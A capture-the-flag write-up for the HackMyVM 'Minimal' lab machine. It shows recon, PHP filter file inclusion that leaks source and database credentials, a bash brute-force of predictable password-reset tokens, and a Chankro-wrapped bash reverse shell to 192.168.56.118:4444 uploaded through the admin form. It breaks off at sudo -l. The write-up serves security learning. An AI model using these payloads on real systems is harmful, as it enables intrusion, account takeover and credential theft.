# CTF Penetration Testing

## HackMyVM

### Minimal - Machine

#### Machine Description

- Machine name: [Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/minimal.png" alt="Minimal Machine Logo" width="150"/>

#### Tools Used

- Burp Suite
- Chankro
- Cutter
- ffuf
- GEF (GDB)
- Gobuster
- Netcat
- Nikto
- Nmap
- PwnTools
- radare2
- socat
- ZAP

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.119  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.132 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.1312:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 03:13 EDT
Nmap scan report for 192.168.56.132
Host is up (0.00072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu)) ←
MAC Address: 08:00:27:6D:21:7B (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds
```

`whatweb http://192.168.56.132 -v`:
```
WhatWeb report for http://192.168.56.132
Status    : 200 OK
Title     : Minimal Shop
IP        : 192.168.56.132
Country   : RESERVED, ZZ

Summary   : Apache[2.4.52], Cookies[PHPSESSID], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)] ←

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.52 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : PHPSESSID

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.52 (Ubuntu) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Thu, 03 Oct 2024 07:16:31 GMT
        Server: Apache/2.4.52 (Ubuntu)
        Set-Cookie: PHPSESSID=2u9s7nnfa19hceslmobmdhrc18; path=/
        Expires: Thu, 19 Nov 1981 08:52:00 GMT
        Cache-Control: no-store, no-cache, must-revalidate
        Pragma: no-cache
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 1209
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

`nikto -h http://192.168.56.132`:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.132
+ Target Hostname:    192.168.56.132
+ Target Port:        80
+ Start Time:         2024-10-03 09:42:28 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords. ←
+ /imgs/: Directory indexing found.
+ /imgs/: This might be interesting. ←
+ /styles/: Directory indexing found.
+ /login.php: Admin login page/section found. ←
+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2024-10-03 09:43:46 (GMT-4) (78 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`gobuster dir -u http://192.168.56.132 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,list,tmp,old,jpg,txt,zip -t 10 --add-slash`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.132
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              list,tmp,old,php,bak,txt,zip,html,jpg
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html/               (Status: 403) [Size: 279]
/.php/                (Status: 403) [Size: 279]
/index.php/           (Status: 200) [Size: 6297]
/login.php/           (Status: 200) [Size: 1019]
/register.php/        (Status: 200) [Size: 1097]
/icons/               (Status: 403) [Size: 279]
/admin.php/           (Status: 302) [Size: 0] [--> login.php] ←
/buy.php/             (Status: 200) [Size: 892] ←
/imgs/                (Status: 200) [Size: 2331]
/logout.php/          (Status: 302) [Size: 0] [--> /index.php]
/config.php/          (Status: 200) [Size: 0] ←
/styles/              (Status: 200) [Size: 1721]
/restricted.php/      (Status: 302) [Size: 0] [--> ../index.php]
/shop_cart.php/       (Status: 302) [Size: 0] [--> ../index.php]
/.php/                (Status: 403) [Size: 279]
/.html/               (Status: 403) [Size: 279]
/server-status/       (Status: 403) [Size: 279]

[...]
```

`burpsuite`

`HTTP Request`:
```http
POST /register.php HTTP/1.1 ←
Host: 192.168.56.132
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://192.168.56.132
Connection: close
Referer: http://192.168.56.132/register.php
Cookie: PHPSESSID=lmuhnvetfqp9615v0l6b5vst91
Upgrade-Insecure-Requests: 1

username=TEST&password=TEST123&mail=test%40mail.com ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Date: Thu, 03 Oct 2024 07:55:53 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 6297
Connection: close
Content-Type: text/html; charset=UTF-8


<html lang="es">

[...]

                        </div><p class="buy logtobuy">Log In to buy</p> ←

[...]

</html>
```

`HTTP Request`:
```http
POST /login.php HTTP/1.1
Host: 192.168.56.132
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://192.168.56.132
Connection: close
Referer: http://192.168.56.132/login.php
Cookie: PHPSESSID=lmuhnvetfqp9615v0l6b5vst91
Upgrade-Insecure-Requests: 1

username=TEST&password=TEST123 ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Date: Thu, 03 Oct 2024 08:00:35 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 6622
Connection: close
Content-Type: text/html; charset=UTF-8


<html lang="es">

[...]

                        </div><button class="buy button" type="submit" value="7" name="product_id">Buy</button></div> ←

[...]

</html>
```

`zaproxy`

`Sites: http://192.168.56.132` > `<right-click>` > `Attack` > `Spider...` > `Starting Point: http://192.168.56.132`, `Recurse: enabled`, `Show Advanced Options: enabled` > `Start Scan` > `Export` > `./spider.csv`

`cat ./spider.csv`:
```
Processed,Method,URI,Flags
true,GET,http://192.168.56.132,Seed
true,GET,http://192.168.56.132/robots.txt,Seed
true,GET,http://192.168.56.132/sitemap.xml,Seed
true,GET,http://192.168.56.132/.php,Seed

[...]

true,GET,http://192.168.56.132/styles/?C=M;O=D,
true,GET,http://192.168.56.132/styles/?C=S;O=D,
true,GET,http://192.168.56.132/styles/?C=D;O=D,
```

`cat ./spider.csv | grep "true" | cut -d ',' -f 3 | tee ./spider_urls.list`:
```
http://192.168.56.132/admin.php ←
http://192.168.56.132/config.php ←
http://192.168.56.132/index.php
http://192.168.56.132/login.php
http://192.168.56.132/logout.php
http://192.168.56.132/register.php
http://192.168.56.132/reset_pass.php ←
http://192.168.56.132/restricted.php
http://192.168.56.132/shop_cart.php
http://192.168.56.132/shop_cart.php?action=buy ←

[...]
```

`curl "http://192.168.56.132/shop_cart.php?action=php://filter/convert.base64-encode/resource=buy" -b "PHPSESSID=lmuhnvetfqp9615v0l6b5vst91" -s`:
```html
<html>

[...]
      PGRpdiBjbGFzcz0iYnV5LWJvZHkiPgogICAgPGZvcm0gY2xhc3M9ImJ1eS1mb3JtIiBhY3Rpb249InNob3BfY2FydC5waHAiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgPGxhYmVsIGZvcj0iZGlyZWNjaW9uIj5BZGRyZXNzOjwvbGFiZWw+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJkaXJlY2Npb24iIG5hbWU9ImRpc
  
[...]

RhcmlvcyIgbmFtZT0iY29tZW50YXJpb3MiIHJvd3M9IjQiIGNvbHM9IjUwIj48L3RleHRhcmVhPgogICAgICAgIDxicj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW5kIHB1cmNoYXNlIj4KICAgIDwvZm9ybT4KPC9kaXY+Cg==

[...]

</html> 
```

`curl "http://192.168.56.132/shop_cart.php?action=php://filter/convert.base64-encode/resource=config" -b "PHPSESSID=lmuhnvetfqp9615v0l6b5vst91" -s`:
```html
<html>

[...]

PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gInNob3BfYWRtaW4iOwokcGFzc3dvcmQgPSAiSGV5LVBscy1Eb250LUNyYWNrLVRoaXMtUGFzc3dkIjsKJGRibmFtZSA9ICJzaG9wIjsKCiRjb

[...]

yb3IiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9CgovLyBDb25maWd1cmFyIGVsIGp1ZWdvIGRlIGNhcmFjdGVyZXMKJGNvbm4tPnNldF9jaGFyc2V0KCJ1dGY4Iik7Cj8+Cg==

[...]

</html> 
```

`echo "PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gInNob3BfYWRtaW4iOwokcGFzc3dvcmQgPSAiSGV5LVBscy1Eb250LUNyYWNrLVRoaXMtUGFzc3dkIjsKJGRibmFtZSA9ICJzaG9wIjsKCiRjb [...] yb3IiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9CgovLyBDb25maWd1cmFyIGVsIGp1ZWdvIGRlIGNhcmFjdGVyZXMKJGNvbm4tPnNldF9jaGFyc2V0KCJ1dGY4Iik7Cj8+Cg==" | base64 -d`:
```php
<?php
$servername = "localhost";
$username = "shop_admin"; ←
$password = "Hey-Pls-Dont-Crack-This-Passwd"; ←
$dbname = "shop";

$conn = new mysqli($servername, $username, $password, $dbname); ←

// Verificar la conexión
if ($conn->connect_error) {
    die("Error" . $conn->connect_error);
}

// Configurar el juego de caracteres
$conn->set_charset("utf8");
?>
```

`curl "http://192.168.56.132/shop_cart.php?action=php://filter/convert.base64-encode/resource=admin" -b "PHPSESSID=lmuhnvetfqp9615v0l6b5vst91" -s`:
```html
<html>

[...]

PD9waHAKcmVxdWlyZV9vbmNlICIuL2NvbmZpZy5waHAiOwoKc2Vzc2lvbl9zdGFydCgpOwoKaWYgKCRfU0VTU0lPTlsndXNlcm5hbWUnXSAhPT0gJ2FkbWluJykgewogICAgaGVhZGVyKCdMb2NhdGlvbjogbG9naW4ucGhwJyk7CiAgICBleGl0Owp9CgokbG9nZ2VkID0gZmFsc2U7CgppZiAoaXNzZXQoJF9TRVNTSU9OWydsb2dnZ

[...]

VpcmVkPgoKICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+CiAgICAgICAgPC9mb3JtPgogICAgPC9kaXY+Cgo8L2JvZHk+Cgo8L2h0bWw+

[...]

</html> 
```

`echo "PD9waHAKcmVxdWlyZV9vbmNlICIuL2NvbmZpZy5waHAiOwoKc2Vzc2lvbl9zdGFydCgpOwoKaWYgKCRfU0VTU0lPTlsndXNlcm5hbWUnXSAhPT0gJ2FkbWluJykgewogICAgaGVhZGVyKCdMb2NhdGlvbjogbG9naW4ucG [...] VpcmVkPgoKICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+CiAgICAgICAgPC9mb3JtPgogICAgPC9kaXY+Cgo8L2JvZHk+Cgo8L2h0bWw+" | base64 -d`:
```php
<?php
require_once "./config.php"; ←

session_start();

if ($_SESSION['username'] !== 'admin') {
    header('Location: login.php');
    exit;
}

$logged = false;

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $logged = true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nombre = $_POST['nombre'];
    $autor = $_POST['autor'];
    $precio = $_POST['precio'];
    $descripcion = $_POST['descripcion'];

    if (isset($_FILES['imagen'])) {
        $imagen = $_FILES['imagen'];
        if ($imagen['error'] === UPLOAD_ERR_OK) {
            $ruta_destino = './imgs/' . basename($imagen['name']);

            if (move_uploaded_file($imagen['tmp_name'], $ruta_destino)) {
                $query = $conn->prepare("INSERT INTO products (name, author, price, description) VALUES (?, ?, ?, ?)");
                $query->bind_param("ssds", $nombre, $autor, $precio, $descripcion);
                // Ejecutar la consulta
                if ($query->execute()) {
	                echo "Uploaded";
                } else {
                    echo "Error";
                }
            } else {
                //"Error al subir la imagen.";
                echo "Error";
            }
        } else {
            echo "Error: " . $imagen['error'];
        }
    }
}

?>
<!DOCTYPE html>
<html>

[...]

<body>

[...]

	<h1>Admin Panel</h1>

[...]

</body>

</html> 
```

`curl "http://192.168.56.132/shop_cart.php?action=php://filter/convert.base64-encode/resource=reset_pass" -b "PHPSESSID=lmuhnvetfqp9615v0l6b5vst91" -s`:
```html
<html>

[...]

PD9waHAKcmVxdWlyZV9vbmNlICIuL2NvbmZpZy5waHAiOwoKJGVycm9yID0gZmFsc2U7CiRkb25lID0gZmFsc2U7CiRjaGFuZ2VfcGFzcyA9IGZhbHNlOwoKc2Vzc2lvbl9zdGFydCgpOwoKJHVzZXJuYW1lID0gbnVsbDsKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSB7CiAgICAkdXNlcm5hbWUgP

[...]

ICAgICAgICAgICAgIGVjaG8gIjxwIGNsYXNzPSdlcnJvcic+Q2hlY2sgbGluayBpbiBlbWFpbDwvcD4iOwogICAgICAgICAgICB9CiAgICAgICAgICAgID8+CiAgICAgICAgPC9mb3JtPgogICAgPC9tYWluPgo8L2JvZHk+Cgo8L2h0bWw+ 

[...]

</html> 
```

`echo "PD9waHAKcmVxdWlyZV9vbmNlICIuL2NvbmZpZy5waHAiOwoKJGVycm9yID0gZmFsc2U7CiRkb25lID0gZmFsc2U7CiRjaGFuZ2VfcGFzcyA9IGZhbHNlOwoKc2Vzc2lvbl9zdGFydCgpOwoKJHVzZXJuYW1lID0gbnVsbDsKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSB7CiAgICAkdXNlcm5hbWUgP [...] ICAgICAgICAgICAgIGVjaG8gIjxwIGNsYXNzPSdlcnJvcic+Q2hlY2sgbGluayBpbiBlbWFpbDwvcD4iOwogICAgICAgICAgICB9CiAgICAgICAgICAgID8+CiAgICAgICAgPC9mb3JtPgogICAgPC9tYWluPgo8L2JvZHk+Cgo8L2h0bWw+" | base64 -d`:
```php
<?php
require_once "./config.php";

$error = false;
$done = false;
$change_pass = false;

session_start();

$username = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') { ←
    $username = $_POST['username'];

    $query = $conn->prepare("SELECT * FROM users WHERE user = ?"); ←
    $query->bind_param("s", $username);

    $query->execute();
    $result = $query->get_result();

    if ($result->num_rows == 1) { ←
        while ($row = $result->fetch_assoc()) {
            $name = $row['user']; ←
            $randomNumber = rand(1, 100); ←
            $nameWithNumber = $name . $randomNumber; ←
            $md5Hash = md5($nameWithNumber); ←
            $base64Encoded = base64_encode($md5Hash); ←

            $deleteQuery = $conn->prepare("DELETE FROM pass_reset WHERE user = ?");
            $deleteQuery->bind_param("s", $name);
            $deleteQuery->execute();

            $insertQuery = $conn->prepare("INSERT INTO pass_reset (user, token) VALUES (?, ?)"); ←
            $insertQuery->bind_param("ss", $name, $base64Encoded); ←

            if ($insertQuery->execute()) {
                $error = false;
                $done = true;
            } else {
                $error = true;
            }
        }
    } else {
        $error = true;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') { ←
    if (isset($_GET['user']) and isset($_GET['token']) and isset($_GET['newpass'])) {
        $user = $_GET['user']; ←
        $token = $_GET['token']; ←
        $newpass = $_GET['newpass']; ←

        // Paso 1: Verificar si el usuario y token coinciden en la tabla pass_reset
        $query = $conn->prepare("SELECT token FROM pass_reset WHERE user = ?"); ←
        $query->bind_param("s", $user);
        $query->execute();
        $result = $query->get_result();

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $storedToken = $row['token'];

            if ($storedToken === $token) { ←
                // Paso 2: Actualizar la contraseña en la tabla users
                $updateQuery = $conn->prepare("UPDATE users SET pass = ? WHERE user = ?"); ←
                $hashedPassword = password_hash($newpass, PASSWORD_DEFAULT);
                $updateQuery->bind_param("ss", $hashedPassword, $user);

                if ($updateQuery->execute()) {
                    echo "Password updated";
                } else {
                    echo "Error updating";
                }
            } else {
                echo "Not valid token";
            }
        } else {
            echo "Error http 418 ;) ";
        }
    }
}
?>

[...]
```

`vim ./reset_admin_password.sh`:
```sh
#!/usr/bin/bash
username="admin"
new_password="password123"
echo "[*] Resetting $username password..."

for user_number in $(echo admin{1..100}); do
    token=$(echo -n $user_number | md5sum | awk '{print $1}'| tr -d '\n' | base64)
    curl -X GET "http://192.168.56.132/reset_pass.php?user=$username&token=$token&newpass=$new_password" -s | grep "Not valid token" &> /dev/null
    if [ $? -eq 1 ]; then
        echo "[+] Correct token is '$token'"    
        echo -n "[+] Password changed to '$new_password'"
        exit 0
    fi
done

echo -n "[-] Failed to reset password for $username."
exit 1
```

`chmod u+x ./reset_admin_password.sh`

`./reset_admin_password.sh`:
```
[*] Resetting admin password...
[+] Correct token is 'MTg0NDE1NmQ0MTY2ZDk0Mzg3ZjFhNGFkMDMxY2E1ZmE='
[+] Password changed to 'password123'
```

`burpsuite`

`HTTP Request`:
```http
POST /login.php HTTP/1.1 ←
Host: 192.168.56.132
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://192.168.56.132
Connection: close
Referer: http://192.168.56.132/login.php
Cookie: PHPSESSID=tdeksnkfvpldhhiojlqigdubb2
Upgrade-Insecure-Requests: 1

username=admin&password=password123 ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Date: Thu, 03 Oct 2024 10:00:59 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 6622
Connection: close
Content-Type: text/html; charset=UTF-8


<html lang="es">

[...]

<body>

[...]

            <a href="./index.php">
                <h1>Minimal</h1>
            </a>

[...]
       
</body>

</html>
```

<div>
	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[Chankro](https://github.com/TarlogicSecurity/Chankro/tree/master)

[**#Chankro**]

Your favourite tool to bypass **disable_functions** and **open_basedir** in your pentests.

PHP in Linux calls a binary (sendmail) when the mail() function is executed. If we have putenv() allowed, we can set the environment variable "LD_PRELOAD", so we can preload an arbitrary shared object. Our shared object will execute our custom payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example.
The syntax is pretty straightforward:
```
$ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
```
Note: path is the absolute path where our .so will be dropped.

`vim ./reverse_shell.sh`:
```sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.118/4444 0>&1 2>&1
```

`python2 chankro.py --arch 64 --input reverse_shell.sh --output reverse_shell.php --path /var/www/html`:
```
     -=[ Chankro ]=-
    -={ @TheXC3LL }=-


[+] Binary file: reverse_shell.sh
[+] Architecture: x64
[+] Final PHP: reverse_shell.php ←


[+] File created! ←
```

`file ./reverse_shell.php`:
```
./reverse_shell.php: PHP script, ASCII text, with very long lines (11352) ←
```

`cat ./reverse_shell.php`:
```php
<?php
 $hook = 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA4AcAAAAAAABAAAAAAAAAAPgZAAAAAAAAAAAAAEAAOAAHAEAAHQAcAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAoAAAAAAABsCgAAAAAAAAAAIAAAAAAAAQAAAAYAAAD4DQAAAA

[...]

AAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=';
$meterpreter = 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjExOC80NDQ0IDI+JjEgMD4mMQo=';
file_put_contents('/var/www/html/chankro.so', base64_decode($hook));
file_put_contents('/var/www/html/acpid.socket', base64_decode($meterpreter));
putenv('CHANKRO=/var/www/html/acpid.socket');
putenv('LD_PRELOAD=/var/www/html/chankro.so');
mail('a','a','a','a');?>              
```

`burpsuite`

`HTTP Request`:
```http
POST /admin.php HTTP/1.1
Host: 192.168.56.132
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------66062017127429232261863440587
Content-Length: 12411
Origin: http://192.168.56.132
Connection: close
Referer: http://192.168.56.132/admin.php
Cookie: PHPSESSID=e832tp27qbat6gn1v5u5lhf00e
Upgrade-Insecure-Requests: 1

-----------------------------66062017127429232261863440587
Content-Disposition: form-data; name="nombre"

TEST
-----------------------------66062017127429232261863440587
Content-Disposition: form-data; name="autor"

TEST
-----------------------------66062017127429232261863440587
Content-Disposition: form-data; name="precio"

1
-----------------------------66062017127429232261863440587
Content-Disposition: form-data; name="descripcion"

TEST
-----------------------------66062017127429232261863440587
Content-Disposition: form-data; name="imagen"; filename="reverse_shell.php" ←
Content-Type: application/x-php

[...]
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Date: Thu, 03 Oct 2024 11:06:29 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1019
Connection: close
Content-Type: text/html; charset=UTF-8

[...]
```

`nc -lnvp 4444`:
```
listening on [any] 4444 ... ←
```

`curl "http://192.168.56.132/imgs/reverse_shell.php" -s`

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.132] 41620 ←
bash: cannot set terminal process group (728): Inappropriate ioctl for device
bash: no job control in this shell
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
www-data ←
```

`id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uname -a`:
```
Linux minimal 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

`ls -alps /var/www/html`:
```
total 76
 4 drwxr-xr-x 4 www-data www-data 4096 Oct  3 11:14 ./
 4 drwxr-xr-x 3 root     root     4096 Nov  1  2023 ../
 4 -rwxrwxrwx 1 www-data www-data   62 Oct  3 11:22 acpid.socket
 4 -rw-rw-r-- 1 www-data www-data 2964 Nov  1  2023 admin.php
 4 -rw-rw-r-- 1 www-data www-data  892 Nov  1  2023 buy.php
12 -rw-r--r-- 1 www-data www-data 8504 Oct  3 11:22 chankro.so
 4 -rw-r--r-- 1 www-data www-data  355 Nov  1  2023 config.php
 4 drwxr-xr-x 2 www-data www-data 4096 Oct  3 11:13 imgs/
 4 -rw-r--r-- 1 www-data www-data 2601 Nov  1  2023 index.php
 4 -rw-r--r-- 1 www-data www-data 1836 Nov  1  2023 login.php
 4 -rw-r--r-- 1 www-data www-data  321 Nov  1  2023 logout.php
 4 -rw-r--r-- 1 www-data www-data 2221 Nov  1  2023 register.php
 4 -rw-rw-r-- 1 www-data www-data 3621 Nov  1  2023 reset_pass.php
 4 -rw-r--r-- 1 www-data www-data  111 Nov  1  2023 restricted.php
 4 -rw-r--r-- 1 www-data www-data   12 Nov  1  2023 robots.txt
 4 -rw-rw-r-- 1 www-data www-data 2549 Nov  1  2023 shop_cart.php
 4 drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 styles/
```

`ls -alps /home`:
```
total 12
4 drwxr-xr-x  3 root  root  4096 Nov  1  2023 ./
4 drwxr-xr-x 20 root  root  4096 Nov  1  2023 ../
4 drwxr-xr-x  5 white white 4096 Nov  1  2023 white/ ←
```

`cd /home/white`

`ls -alps`:
```
total 36
4 drwxr-xr-x 5 white white 4096 Nov  1  2023 ./
4 drwxr-xr-x 3 root  root  4096 Nov  1  2023 ../
0 lrwxrwxrwx 1 white white    9 Nov  1  2023 .bash_history -> /dev/null
4 -rw-r--r-- 1 white white  220 Jan  6  2022 .bash_logout
4 -rw-r--r-- 1 white white 3797 Nov  1  2023 .bashrc
4 drwx------ 2 white white 4096 Nov  1  2023 .cache/
4 drwxrwxr-x 3 white white 4096 Nov  1  2023 .local/
4 -rw-r--r-- 1 white white  807 Jan  6  2022 .profile
4 drwx------ 2 white white 4096 Nov  1  2023 .ssh/
0 -rw-r--r-- 1 white white    0 Nov  1  2023 .sudo_as_admin_successful
4 -rw-rw-r-- 1 white white   34 Nov  1  2023 user.txt ←
```

`cat ./user.txt`:
```
HMV{can_you_find_the_teddy_bear?} ←
```

`sudo -l`:
```
Matching Defaults entries for www-data on minimal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
